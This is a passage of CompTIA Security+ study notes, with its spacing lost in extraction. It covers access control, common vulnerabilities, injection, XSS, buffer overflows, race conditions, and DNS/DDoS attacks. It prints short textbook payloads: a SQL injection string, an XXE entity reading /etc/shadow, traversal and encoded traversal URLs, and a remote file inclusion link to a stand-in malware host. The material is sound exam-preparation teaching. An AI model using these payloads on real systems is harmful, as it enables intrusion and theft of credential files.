+specifictask● Reducestheriskofunauthorizedaccessormisuseofprivileges● Accessrightsaregivenwhenthetaskbeginsandrevokedoncethetaskis
+
+completed■ PasswordVaulting● Techniquethatstoresandmanagespasswordssecurely,ofteninadigital
+
+vault.● Requiresmulti-factorauthenticationforaccessingstoredpasswords● Tracksaccesstoprivilegedcredentials,providinganaudittrail■ TemporalAccounts● Temporaryaccountsusedfortime-limitedaccesstoresources● Createdforspecificpurposesandautomaticallydisabledordeletedafter
+
+apredefinedperiod
+
+● AccessControlModels○ DifferentTypesofAccessControlModels■ MandatoryAccessControl(MAC)● Usessecuritylabelstoauthorizeresourceaccess● Requiresassigningsecuritylabelstobothusersandresources
+
+243https://www.DionTraining.com
+
+## Page 244
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Accessisgrantedonlyiftheuser'slabelisequaltoorhigherthanthe
+
+resource'slabel■ DiscretionaryAccessControl(DAC)● Resourceownersspecifywhichuserscanaccesstheirresources● Accesscontrolbasedonuseridentity,profile,orrole● Allowsresourceownerstograntaccesstospecificusers■ Role-BasedAccessControl(RBAC)● Assignsuserstorolesandassignspermissionstoroles● Rolesmimictheorganization'shierarchy● Enforcesminimumprivileges● Effectiveformanagingpermissionsbasedonjobrolesandturnover■ Rule-BasedAccessControl● Usessecurityrulesoraccesscontrollists● Policiescanbechangedquicklyandfrequently● Appliedacrossmultipleusersonanetworksegment■ Attribute-BasedAccessControl(ABAC)● Considersvariousattributeslike○ UserAttributes■ User’sname,role,organizationID,orsecurityclearance○ EnvironmentAttributes■ Timeofaccess,datalocation,andcurrentorganization’s
+
+threatlevel○ ResourceAttributes■ Filecreationdate,resourceowner,filename,anddata
+
+sensitivity● Accessdecisionsarebasedonthecombinationofattributes
+
+244https://www.DionTraining.com
+
+## Page 245
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Providesfine-grainedcontrolanddynamicaccessdecisions○ AccessControlExtensions■ Time-of-DayRestrictions● Limitsaccessbasedonspecifictimeperiods● Oftenusedtocomplementotheraccesscontrolmodels● Helpspreventunauthorizedaccessduringnon-workinghours■ PrincipleofLeastPrivilege● Usersaregrantedtheminimumaccessrequiredtoperformtheirjob
+
+functions● Reducestheriskofmisuseoraccidentaldamage● Regularlyreviewandadjustpermissionstopreventauthorizationcreep
+
+● AssigningPermissions○ Privileges■ Definethelevelsofaccessthatusershave■ LocalAdministrationAccount● Highlevelofaccess● Allowsadministratorto○ changesystemsettings○ installsoftwares○ performavarietyofmanagerialtasks■ StandardUserAccounts● Can’tchangesystemsettings● Canstorefilesintheirdesignatedareaonly○ PrincipleofLeastPrivilege■ Ausershouldonlyhavetheminimumaccessrightsneededtoperformtheirjob
+
+245https://www.DionTraining.com
+
+## Page 246
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+functionsandtasks,andnothingadditionalorextra○ MicrosoftAccount■ FreeonlineaccountthatyoucanusetosignintoavarietyofMicrosoftservices○ UserAccountControl(UAC)■ Amechanismdesignedtoensurethatactionsrequiringadministrativerightsare
+
+explicitlyauthorizedbytheuser■ Accessislimitedtowhattheuserneedstodoajob■ Purposeistominimizetheriskofusersgainingaccesstoadministrativeprivileges○ Accesscontrolandpermissionscanalsoapplytogroupsofusers○ FileandFolderPermissions■ Settingpermissionsatthefolderlevelappliesthosepermissionstoallfileswithin
+
+thatfolder■ InWindows,thesefileandfolderpermissionsareaccessedby● Right-clickonafileorfolder● Select‘Properties’● Navigatetothe‘Security’tab○ Alwaysensuretoonlygiveoutthenecessarypermissions
+
+246https://www.DionTraining.com
+
+## Page 247
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+VulnerabilitiesandAttacks
+
+Objectives:● 2.2:Explaincommonthreatvectorsandattackstrategies● 2.3:Explainvarioustypesofvulnerabilities● 2.4:Givenascenario,youmustbeabletoanalyzeindicatorsofmaliciousactivity● 2.5:Explainthepurposeofmitigationtechniquesusedtosecuretheenterprise● 4.1:Givenascenario,youmustbeabletoapplycommonsecuritytechniquestocomputing
+
+resources
+
+● VulnerabilitiesandAttacks○ Vulnerabilities■ Weaknessesorflawsinhardware,software,configurations,orprocesses■ Consequences● UnauthorizedAccess● DataBreaches● SystemDisruptions○ Attacks■ Deliberateactionsbythreatactorstoexploitvulnerabilities■ Forms● UnauthorizedAccess● DataTheft● MalwareInfections● DoSAttacks● SocialEngineering
+
+247https://www.DionTraining.com
+
+## Page 248
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ HardwareVulnerabilities■ Focus● Firmware● End-of-lifesystems● Missingpatches● Misconfigurations■ Mitigation● Hardensystems● Patch● Enforcebaselineconfigurations● Decommissionoldassets● Isolation○ BluetoothVulnerabilitiesandAttacks■ Vulnerabilitiesattackslikethefollowing● Bluesnarfing● Bluejacking● Bluebugging● Bluesmark● Blueborne○ MobileVulnerabilitiesandAttacks■ Topics● Sideload● Jailbreaking● Insecureconnections■ Mitigation● PatchManagement
+
+248https://www.DionTraining.com
+
+## Page 249
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● MobileDeviceManagement● Preventsideloading● Rooting○ Zero-DayVulnerabilities■ Newlydiscoveredandexploitedvulnerabilities■ Challenge● Noknowndefensesormitigations○ OperatingSystemVulnerabilities■ Types● Unpatchedsystems● Zero-days● Misconfigurations● Dataexfiltration● Maliciousupdates■ Protection● Patching● Configurationmanagement● Encryption● Endpointprotection● Firewalls● IPS● Accesscontrols○ SQLandXMLInjections■ SQLInjection● Exploitswebappordatabasevulnerabilities
+
+249https://www.DionTraining.com
+
+## Page 250
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ XMLInjection● TargetsXMLdataprocessing○ Cross-SiteScripting(XSS)andCross-SiteRequestForgery(CSRF)Attacks■ Cross-SiteScripting(XSS)● Injectsmaliciousscriptsintowebpages■ Cross-SiteRequestForgery(CSRF)● Triggersactionsondifferentwebsiteswithoutuserconsent○ BufferOverflows■ Softwarevulnerabilitywhenmoredataiswrittentoamemorybufferthanitcan
+
+hold○ RaceConditions■ Multipleprocessesorthreadsaccessingsharedresourcessimultaneously■ KeyTerms● Time-of-Check(TOC)● Target-of-Evaluation(TOE)● Time-of-Use(TOU)
+
+● HardwareVulnerabilities○ HardwareVulnerabilities■ Securityflawsorweaknessesinadevice'sphysicalcomponentsordesignthat
+
+canbeexploitedtocompromisesystemintegrity,confidentiality,oravailability○ TypesofHardwareVulnerabilities■ FirmwareVulnerabilities● Specializedsoftwarestoredonhardwaredevices● Cangrantattackersfullcontrol,leadingtounauthorizedaccessor
+
+takeover
+
+250https://www.DionTraining.com
+
+## Page 251
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Vulnerabilitiesduetoinsecuredevelopment,outdatedpractices,and
+
+- verlookedupdates■ End-of-Life,Legacy,andUnsupportedSystems● End-of-life○ Noupdatesorsupportfromthemanufacturer
+● Legacy○ Outdatedandsupersededbyneweralternatives● Unsupported○ Noofficialsupport,securityupdates,orpatches● Vulnerableduetothelackofpatchingandupdates■ UnpatchedSystems● Devices,applications,orsoftwarewithoutthelatestsecuritypatches● Exposedtoknownexploitsandattacks● Riskfromoversight,negligence,orchallengesinupdating■ HardwareMisconfigurations● Incorrectdevicesettingsoroptions● Mayleadtovulnerabilities,performanceissues,orunintendedbehavior● Causedbyoversight,lackofunderstanding,ordeploymenterrors○ MitigationStrategies■ Hardening● Tightensecuritybyclosingunnecessaryports,disablingservices,and
+
+settingpermissions■ Patching● Regularupdatestofixknownvulnerabilitiesinsoftware,firmware,and
+
+applications
+
+251https://www.DionTraining.com
+
+## Page 252
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ ConfigurationEnforcement● Ensuredevicesadheretosecureconfigurations■ Decommissioning● Retireend-of-lifeorlegacysystemsposingsecurityrisks■ Isolation● Isolatevulnerablesystemsfromtheenterprisenetwork■ Segmentation● Dividethenetworkintosegmentstolimittheimpactofbreaches
+
+● BluetoothVulnerabilitiesandAttacks○ Bluetooth■ Wirelesstechnologyforshort-distancedataexchange■ It'scommonlyusedforconnectingdevicesbutpresentssecuritychallenges■ Vulnerabilitiesinclude● Insecurepairing○ OccurswhenBluetoothdevicesestablishaconnectionwithout
+
+properauthentication● Devicespoofing○ Occurswhenanattackerimpersonatesadevicetotrickauserinto
+
+connecting● On-pathattacks○ ExploitsBluetoothprotocolvulnerabilitiestointerceptandalter
+
+communicationsbetweendeviceswithouteitherpartybeing
+
+aware
+
+252https://www.DionTraining.com
+
+## Page 253
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ DifferentTypesofBluetoothAttacks■ Bluejacking● SendingunsolicitedmessagestoaBluetoothdevice● Oftenusedforpranksortestingvulnerabilities■ Bluesnarfing● Unauthorizedaccesstoadevicetostealinformationlikecontacts,call
+
+logs,andtextmessages
+
+■ Bluebugging● Allowsattackerstotakecontrolofadevice'sBluetoothfunctions● Canmakecalls,sendmessages,oraccesstheinternet■ Bluesmack● Denial-of-serviceattackbyoverwhelmingadevicewithdata,causingitto
+
+crashorbecomeunresponsive■ BlueBorne● Spreadsthroughtheairtoinfectdeviceswithoutuserinteraction○ BestPracticesforSecureBluetoothUsage■ TurnoffBluetoothwhennotinuse● Reducestheattacksurfaceandexposuretothreats■ Setdevicesto"non-discoverable"modebydefault● Preventsunsolicitedconnectionattempts■ Regularlyupdatefirmware● Ensuressecurityisup-to-datewithpatchesforvulnerabilities■ Onlypairwithknownandtrusteddevices● Mitigatestheriskofconnectingtomaliciousdevices
+
+253https://www.DionTraining.com
+
+## Page 254
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ UseauniquePINorpasskeyduringpairing● Addssecurityduringthepairingprocess■ Becautiousofunsolicitedconnectionrequests● Avoidacceptingrequestsblindly■ Useencryptionforsensitivedatatransfers● Scramblesdatatopreventunauthorizedaccess
+
+● MobileVulnerabilitiesandAttacks○ DifferentTypesofMobileVulnerabilities■ Sideloading● Installingappsfromunofficialsourcesbypassingthedevice'sdefaultapp
+
+store● Canintroducemalware;downloadappsfromofficialsourceswithstrict
+
+reviewprocesses● Mitigationtechniques○ alwaysdownloadappsfromanofficialandtrustedsource■ Jailbreaking/Rooting● Givesusersescalatedprivilegesbutexposesdevicestopotentialsecurity
+
+breaches● Preventsinstallationofmanufacturerupdates,leavingdevicesvulnerable■ InsecureConnectionMethods● UsingopenWi-Finetworksorpairingwithunknowndevicesover
+
+Bluetoothexposesdevicestoattacks● Mitigationtechniques○ Usecellulardataformoresecureconnections○ Connectonlytoknowndevicesandsetdevicesto
+
+254https://www.DionTraining.com
+
+## Page 255
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+non-discoverablewhennotpairing○ Uselong,strong,complexpasswords○ Use802.1xauthenticationmethods○ MobileDeviceManagement(MDM)■ MDMsolutionsminimizemobilevulnerabilitiesby● Patching○ Ensuringdevicesreceivenecessarysecurityupdates● ConfigurationManagement○ Enforcingstandardizedconfigurationsforsecurity● BestPracticeEnforcement○ Disablingsideloading,detectingjailbreaking/rooting,and
+
+enforcingVPNuse
+
+● Zero-dayVulnerabilities○ Zero-dayVulnerabilities■ Discoveredorexploitedbeforevendorsissuepatches○ Zero-dayExploits■ Attacksthattargetpreviouslyunknownvulnerabilities○ Zero-day■ Refertothevulnerability,exploit,ormalwarethatexploitsthevulnerability○ Zero-DayExploitsandValue■ Zero-dayexploitsaresignificantinthecybersecurityworldandcanbelucrative■ Bugbountyhunterscanearnmoneybydiscoveringzero-dayvulnerabilities■ Zero-daysarealsosoldtogovernmentagencies,lawenforcement,andcriminals■ Threatactorssavezero-daysforhigh-valuetargets,usinggenericmalwarefor
+
+initialattempts
+
+255https://www.DionTraining.com
+
+## Page 256
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Anup-to-dateantiviruscandetectknownvulnerabilities'exploitation■ Countriesandnationstatesmaystockpilezero-daysforespionageandstrategic
+
+- perations
+● OperatingSystemVulnerabilities○ UnpatchedSystems■ Lackthelatestsecurityupdates,makingthemvulnerable■ Attackersexploitknownvulnerabilitiesinunpatchedsystems■ Tomitigateunpatchedsystemvulnerabilities,ensureregularsystemupdatesand
+
+patches,eitherautomaticallyormanually○ Zero-DayVulnerabilities■ Zero-days● Unknownvulnerabilitiestodevelopersandattackers■ Securitysolutionslikehost-basedintrusionpreventionsystems(IPS)canhelp
+
+detectandblocksuspiciousactivities■ Frequentsystemandsoftwareupdatesprovideadditionaldefenseagainst
+
+potentialzero-dayexploits○ Misconfigurations■ Occurswhensystemsettingsareimproperlyconfigured■ Standardizeandautomateconfigurationprocesseswithconfiguration
+
+managementtools■ Conductperiodicauditsandreviewstoidentifyandmitigatevulnerabilitiesdue
+
+tomisconfigurations○ DataExfiltration■ Involvesunauthorizeddatatransfersfromanorganizationtoanexternallocation■ Protectagainstdataexfiltrationwithencryptionfordataatrestandendpoint
+
+256https://www.DionTraining.com
+
+## Page 257
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+protectiontools■ Endpointprotectiontoolscanmonitorandrestrictunauthorizeddatatransfers○ MaliciousUpdates■ Appearaslegitimatesecurityupdatesbutcontainmalwareorexploits■ Sourceupdatesfromtrustedvendorsandofficialchannels■ Maintainapplicationallowlists,verifyupdateauthenticitywithdigitalsignatures
+
+andhashes
+
+● SQLandXMLInjections○ InjectionAttack■ Involvessendingmaliciousdatatoasystemforunintendedconsequences■ SQLinjectionandXMLinjectionsharethegoalofinsertingcodeintosystems○ SQL(StructuredQueryLanguage)Injection■ SQLData● Usedtointeractwithdatabases● FourmainSQLactions○ Select■ Usedtoreaddatafromthedatabase○ Insert■ Usedtowritedataintothedatabase○ Delete■ Usedtoremovedatafromthedatabase○ Update■ Overwritesomedatainthedatabase
+
+257https://www.DionTraining.com
+
+## Page 258
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Examplestatement○ SELECT*FROMUSERSWHEREuserID='Jason'ANDpassword=
+
+'pass123';■ SQLInjection● InvolvesinsertingmaliciousSQLcodeintoinputfields● AttackersuseURLparameters,formfields,cookies,POSTdata,orHTTP
+
+headersforSQLinjection● Prevention○ Inputvalidation○ Sanitizeuserdata○ Useawebapplicationfirewall● SQLInjectionAttempt○ Involvestatementslike"‘OR1=1"○ Example■ OriginalSQLstatement● SELECT*FROMUSERSWHEREuserID='Jason'AND
+
+password='pass123';■ InjectedSQLstatement● SELECT*FROMUsersWHEREuserID='Jason'AND
+
+password=''OR1=1;○ XML(ExtensibleMarkupLanguage)Injection■ XMLData● Usedfordataexchangeinwebapplications● Shouldbesentwithinanencryptedtunnel,likeTLS● Inputvalidationandsanitizationarecrucialforprotection● Appearsastaggedfields
+
+258https://www.DionTraining.com
+
+## Page 259
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Example○ <?xmlversion="1.0"encoding="UTF-8"?>
+
+<question>
+
+### <Id>Security-002-0001</Id>
+
+<title>IsthisanXMLvulnerability?</title>
+
+<choice1>Option1</choice1>
+
+<choice2>Option2</choice2>
+
+</question>
+
+■ XMLExploits● XMLBomb(BillionLaughsAttack)○ Consumesmemoryexponentially,actinglikeadenial-of-service
+
+attack● XXE(XMLExternalEntity)Attack○ Attemptstoreadlocalresources,likepasswordhashesinthe
+
+shadowfile○ Example■ <?xmlversion="1.0"encoding="UTF-8"?>
+
+<!DOCTYPEfoo[
+
+<!ELEMENTfooANY>
+
+<!ENTITYxxeSYSTEM"file:///etc/shadow">
+
+]>
+
+<foo>Somedata</foo>■ Prevention● Implementproperinputvalidation
+
+259https://www.DionTraining.com
+
+## Page 260
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● XSSandXSRF○ Cross-SiteScripting(XSS)■ Injectsamaliciousscriptintoatrustedsitetocompromisethesite’svisitors■ Goal● Havevisitorsrunamaliciousscriptsoyoursystemwillprocessit,
+
+bypassingthenormalsecuritymechanisms■ Mitigatethethreatwithproperinputvalidation■ FourstepstoanXSSattack● Theattackeridentifiesaninputvalidationvulnerabilitywithinatrusted
+
+website● TheattackercraftsaURLtoperformacodeinjectionagainstthetrusted
+
+website● Thetrustedsitewillreturnapagecontainingthemaliciouscodeinjected● Themaliciouscoderunsintheclient’sbrowserwithpermissionlevelas
+
+thetrustedsite■ FunctionsofaXSSAttack● Defacingthetrustedwebsite● Stealingtheuser’sdata● Interceptingdataorcommunications■ TypesofXSSAttacks● Non-PersistentXSS○ AXSSattackthatonlyoccurswhenitislaunchedandonly
+
+happensonce○ Serverexecutestheattack(Server-sidescriptingattack)● PersistentXSS○ Allowsanattackertoinsertcodeintoabackenddatabaseusedby
+
+260https://www.DionTraining.com
+
+## Page 261
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+thattrustedwebsite○ Serverexecutestheattack(Server-sidescriptingattack)● DocumentObjectModel(DOM)XSS○ Exploitstheclient’swebbrowserusingclient-sidescriptsto
+
+modifythecontentandlayoutofthewebpage○ Client’sdeviceexecutestheattack(Client-sidescriptingattack)○ CanbeusedtochangetheDOMenvironment○ Runsusingtheloggedinuser’sprivilegesonthelocalsystem○ SessionManagement■ Enableswebapplicationstouniquelyidentifyauseracrossseveraldifferent
+
+actionsandrequests■ Fundamentalsecuritycomponentinmodernwebapplications■ CookieTracking● Cookie○ Textfileusedtostoreinformationaboutauserwhentheyvisita
+
+website○ Non-persistentcookies■ Alsoknownasasessioncookie■ Residesinmemoryandareusedforaveryshorttime
+
+period■ Deletedattheendofthesession○ Persistentcookies■ Storedinthebrowsercacheuntileitherdeletedbyauser
+
+- rexpire■ SessionHijacking● Typeofspoofingattackwheretheattackerdisconnectsahostandthen
+261https://www.DionTraining.com
+
+## Page 262
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+replacesitwithhisorherownmachinebyspoofingtheoriginalhostIP● SessionPrediction○ Typeofspoofingattackwheretheattackerattemptstopredictthe
+
+sessiontokeninordertohijackthesession○ Preventtheseattacksbyusinganon-predictablealgorithmto
+
+generatesessiontokens○ XSRF■ Maliciousscriptisusedtoexploitasessionstartedonanothersitewithinthe
+
+samewebbrowser■ Canbedisguised● Canusetags,images,andotherHTMLcode■ Doesn’tneedvictimtoclickonalink■ Prevention● Useuser-specifictokensinallformsubmissions● Addrandomnessandpromptforadditionalinformationwheneverauser
+
+triestoresettheirpassword○ Requiretwo-factorauthentication● Requireuserstoentertheircurrentpasswordwhenchangingtheir
+
+password
+
+● BufferOverflow○ BufferOverflowAttack■ Occurswhenaprocessstoresdataoutsidethememoryrangeallocatedbythe
+
+developer■ Commoninitialattackvectorindatabreaches● 85%ofdatabreachesusedbufferoverflowastheinitialvector
+
+262https://www.DionTraining.com
+
+## Page 263
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Attackersexploittheexcessdatawrittenbeyondbufferboundariesto
+
+manipulateprogramexecution○ Buffers■ Temporarystorageareasusedbyprogramstoholddata■ Theyhaveadefinedmemorycapacity,justlikeaglassholdingalimitedamount
+
+- fwater■ Overflowingabufferresultsindataspillingintoadjacentmemorylocations,
+causingunintendedconsequences○ TechnicalAspects■ Stack● Programshaveareservedmemoryareacalledastacktostoredataduring
+
+processing■ Thestackusesa"firstin,lastout"organization■ Stackcontainsreturnaddresseswhenafunctioncallinstructionisreceived■ Attackersaimtooverwritethereturnaddresswiththeirmaliciouscode'saddress○ SmashingtheStack■ Attackersaimtooverwritethereturnaddresswithapointertotheirmalicious
+
+code■ Whenthenon-maliciousprogramhitsthemodifiedreturnaddress,itrunsthe
+
+attacker'scode■ Thisgivesattackersacommandpromptonthevictim'ssystemforremotecode
+
+execution○ NOPSlide■ AttackersfillthebufferwithNOP(No-Operation)instructions■ ThereturnaddressslidesdowntheNOPinstructionsuntilitreachesthe
+
+attacker'scode
+
+263https://www.DionTraining.com
+
+## Page 264
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ MitigationsagainstBufferOverflowAttack■ AddressSpaceLayoutRandomization(ASLR)● Helpspreventattackersfromguessingreturnpointeraddresses● Randomizesmemoryaddressesusedbywell-knownprograms,makingit
+
+hardertopredictthelocationoftheattacker'scode
+
+● RaceConditions○ RaceConditions■ Softwarevulnerabilitiesrelatedtotheorderandtimingofeventsinconcurrent
+
+processes■ Exploitingraceconditionsallowsattackerstodisruptintendedprogrambehavior
+
+andgainunauthorizedaccess○ UnderstandingRaceConditions■ Raceconditionsoccurwhenmultiplethreadsorprocessesaccessandmanipulate
+
+sharedresourcessimultaneously■ Dereferencing● Softwarevulnerabilitythatoccurswhenthecodeattemptstoremovethe
+
+relationshipbetweenapointerandthethingthatthepointerwas
+
+pointingtointhememorywhichallowschangestobemade■ Vulnerabilitiesstemfromunexpectedconflictsandsynchronizationissues○ ExploitingRaceConditions■ Attackersexploitraceconditionsbytimingtheiractionstocoincidewith
+
+vulnerablecodeexecution■ Exploitationmayleadtounauthorizedaccess,datamanipulation,orsystem
+
+crashes
+
+264https://www.DionTraining.com
+
+## Page 265
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ DirtyCOWExploit■ Areal-worldexampleofraceconditionexploitation■ TargetedLinuxandAndroidsystems,leveragingraceconditionsintheCopyOn
+
+Writefunction○ TypesofRaceConditions■ Time-of-Check(TOC)● Attackersmanipulatearesource'sstateafteritischeckedbutbeforeitis
+
+used● Forexample,overdrawingabankaccountduetoatimedelaybetween
+
+checkingandtransferringfunds■ Time-of-Use(TOU)● Attackersalteraresource'sstateafteritischeckedbutbeforeitisused● Focusesonthetimewhentheresourceisutilized,ratherthanthetimeof
+
+theinitialcheck■ Time-of-Evaluation(TOE)● Attackersmanipulatedataorresourcesduringthesystem's
+
+decision-makingorevaluationprocess● Canleadtoincorrectresultsorunexpectedbehavior○ MitigatingRaceConditions■ Uselocksandmutexestosynchronizeaccesstosharedresources● Mutex○ Mutuallyexclusiveflagthatactsasagatekeepertoasectionof
+
+codesothatonlyonethreadcanbeprocessedatatime○ Mutexesensureonlyonethreadorprocesscanaccessaspecific
+
+sectionofcodeatatime■ Properlydesignandtestlockstopreventdeadlocks
+
+265https://www.DionTraining.com
+
+## Page 266
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Deadlock● Occurswhenalockremainsinplacebecausetheprocessit’swaitingforis
+
+terminated,crashes,ordoesn’tfinishproperly,despitetheprocessing
+
+beingcomplete
+
+266https://www.DionTraining.com
+
+## Page 267
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+MaliciousActivity
+
+Objective2.4:Givenascenario,youmustbeabletoanalyzeindicatorsofmaliciousactivity
+
+● MaliciousActivity○ MaliciousActivity■ Constantlyevolvingthreatsinthedigitalage■ Concerns● Cyberattacks,increasinginfrequencyandsophistication■ Purpose● Delveintocyberthreats,types,mechanisms,andimpacts○ UnderstandingCyberThreats■ Importance● Firststeptoeffectivepreventionandmitigation■ Insights● Tactics,techniques,andproceduresemployedbycybercriminals○ DistributedDenialofService(DDoS)Attacks■ Variants● DenialofService● AmplifiedDDoS● ReflectedDDoS○ DomainNameServer(DNS)Attacks■ Types● DNSCachePoisoning● DNSAmplification● DNSTunneling
+
+267https://www.DionTraining.com
+
+## Page 268
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● DomainHijacking● DNSZoneTransfer○ DirectoryTraversalAttacks■ Exploitinginsufficientsecurityvalidationofuser-suppliedinputfilenames○ PrivilegeEscalationAttack■ Exploitingsystemvulnerabilitytogainelevatedaccess○ ReplayAttacks■ Maliciousorfraudulentrepeat/delayofavaliddatatransmission○ SessionHijacking■ Attackertakesoverausersessiontogainunauthorizedaccess○ MaliciousCodeInjectionAttacks■ Introductionofharmfulcodeintoaprogramorsystem○ IndicatorsofCompromise(IoC)■ Examples● Accountlockout● Concurrentsessionusage● Blockedcontent● Impossibletravel● Resourceconsumption● Inaccessibility● Out-of-cyclelogging● Publisheddocumentsindicatinghacking● Missinglogs
+
+268https://www.DionTraining.com
+
+## Page 269
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● DistributedDenialofService○ DenialofService(DoS)■ Usedtodescribeanattackthatattemptstomakeacomputerorserver’s
+
+resourcesunavailable○ FloodAttacks■ PingFlood● OverloadingaserverwithICMPechorequests(pings)● Oftencounteredbyblockingechoreplies■ SYNFlood● InitiatingmultipleTCPsessionsbutnotcompletingthe3-wayhandshake● Consumesserverresourcesandpreventslegitimateconnections● Countermeasures○ Floodguard○ Timeoutconfigurations○ Intrusionpreventionsystems○ PermanentDenialofService(PDOS)Attack■ Exploitssecurityflawstobreakanetworkingdevicepermanentlybyre-flashing
+
+itsfirmware■ Requiresafullfirmwarereloadtobringthedevicebackonline○ ForkBomb■ Attackcreatesalargenumberofprocesses,consumingprocessingpower■ Notconsideredaworm,asitdoesn'tinfectprogramsorusethenetwork■ Self-replicatingnaturecausesadenialofservicecondition○ DistributedDenialofService(DDoS)attack■ Maliciousattempttodisruptthenormalfunctioningofanetwork,service,or
+
+websitebyoverwhelmingitwithafloodofinternettraffic
+
+269https://www.DionTraining.com
+
+## Page 270
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Involvesmultiplemachinesattackingasingleserversimultaneously.■ Attackersoftenusecompromisedmachineswithinabotnet■ TechniqueslikeDNSamplificationcanamplifytheattack'simpact● DNSAmplificationAttack○ SpecializedDDoSthatallowsanattackertoinitiateDNSrequests
+
+fromaspoofIPaddresstofloodawebsite■ DDoSattacksaimtoforcethetargetserverofflinetemporarily○ SurvivingandPreventingDoSandDDoSAttacks■ BlackHoleorSinkhole● RoutesattackingIPtraffictoanon-existentserverthroughanullinterface● Effectivebuttemporarysolution■ IntrusionPreventionSystems● CanidentifyandrespondtoDoSattacksforsmall-scaleincidents■ ElasticCloudInfrastructure● Scalinginfrastructurewhenneededtohandlelarge-scaleattacks● Mayresultinincreasedcostsfromserviceproviders■ SpecializedCloudServiceProviders● ProviderslikeCloudFlareandAkamaiofferDDoSprotectionservices● Providewebapplicationfiltering,contentdistribution,androbust
+
+networkdefenses● HelporganizationswithstandDDoSandhigh-bandwidthattacks
+
+● DomainNameSystem(DNS)Attacks○ DomainNameSystem(DNS)■ Fundamentalcomponentoftheinternetthatisresponsiblefortranslating
+
+human-friendlydomainnamesintoIPaddressesthatcomputerscanunderstand
+
+270https://www.DionTraining.com
+
+## Page 271
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ SomeoftheVariousTypesofDNSAttacks■ DNSCachePoisoning(DNSSpoofing)● CorruptsaDNSresolver'scachewithfalseinformation● Redirectsuserstomaliciouswebsites● Mitigation○ UseDNSSEC(DomainNameSystemSecurityExtensions)toadd
+
+digitalsignaturestoDNSdata○ Implementsecurenetworkconfigurationsandfirewallstoprotect
+
+DNSservers■ DNSAmplificationAttacks● OverwhelmsatargetsystemwithDNSresponsetrafficbyexploitingthe
+
+DNSresolutionprocess● SpoofedDNSqueriessenttoopenDNSservers● Mitigation○ LimitthesizeofDNSresponses○ RatelimitDNSresponsetraffictoreducetheimpact■ DNSTunneling● Encapsulatesnon-DNStraffic(e.g.,HTTP,SSH)overport53● Attemptstobypassfirewallrulesforcommandandcontrolordata
+
+exfiltration● Mitigation○ MonitorandanalyzeDNSlogsforunusualpatternsindicating
+
+tunneling■ DomainHijacking(DomainTheft)● Unauthorizedchangeofdomainregistration● Mayleadtolossofwebsitecontrolandredirectiontomalicioussites
+
+271https://www.DionTraining.com
+
+## Page 272
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Mitigation○ Regularlyupdateandsecureregistrationaccountinformation○ Usedomainregistrylockservicestopreventunauthorized
+
+changes■ DNSZoneTransferAttacks● AttemptstoobtainanentireDNSzonedatacopy● Exposessensitiveinformationaboutadomain'snetworkinfrastructure● Couldbeusedforreconnaissanceinfutureattacks
+
+● DirectoryTraversalAttack○ DirectoryTraversalAttack■ Aninjectionattackoccurswhentheattackerinsertsmaliciouscodethroughan
+
+applicationinterface■ Applicationattackthatallowsaccesstocommands,files,anddirectoriesthat
+
+mayormaynotbeconnectedtothewebdocumentrootdirectory● http://diontraining.com/../../../../etc/shadow● Unixsystemsuse../● Windowssystemsuse..\bydefaultbutmayalsoaccepttheUnix-like../■ Directorytraversalsmaybeusedtoaccessanyfileonasystemwiththeright
+
+permissions○ WARNING■ Attackersmayuseencodingtohidedirectorytraversalattempts(%2e%2e%2f
+
+represents../)○ FileInclusion■ Webapplicationvulnerabilitythatallowsanattackereithertodownloadafile
+
+fromanarbitrarylocationonthehostfilesystemortouploadanexecutableor
+
+272https://www.DionTraining.com
+
+## Page 273
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+scriptfiletoopenabackdoor■ RemoteFileInclusion● Anattackerexecutesascripttoinjectaremotefileintothewebappor
+
+website○ https://diontraining.com/login.php?○ user=http://malware.bad/malicious.php■ LocalFileInclusion● Anattackeraddsafiletothewebapporwebsitethatalreadyexistson
+
+thehostingserver○ https://diontraining.com/login.php○ user=../../Windows/system32/cmd.exe%00■ Logscontaining../pertaintodirectorytraversals○ Topreventdirectorytraversalsandfileinclusionattacks,useproperinputvalidation
+
+● ExecutionandEscalationAttacks○ ArbitraryCodeExecution■ Vulnerabilityallowsanattackertoruntheircodewithoutrestrictions■ Letsattackersexecutetheircodeonthetargetsystem○ RemoteCodeExecution■ Typeofarbitrarycodeexecutionthatoccursremotely,oftenovertheinternet○ PrivilegeEscalation■ Gaininghigher-levelpermissionsthanoriginallyassigned■ Allowsattackerstooperatewithelevatedprivileges,suchasadministratoror
+
+rootaccess■ VerticalPrivilegeEscalation● Goingfromnormalusertohigherprivilege(e.g.,adminorroot)
+
+273https://www.DionTraining.com
+
+## Page 274
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Commonlyassociatedwithcodeexecutionleadingtoadmin-level
+
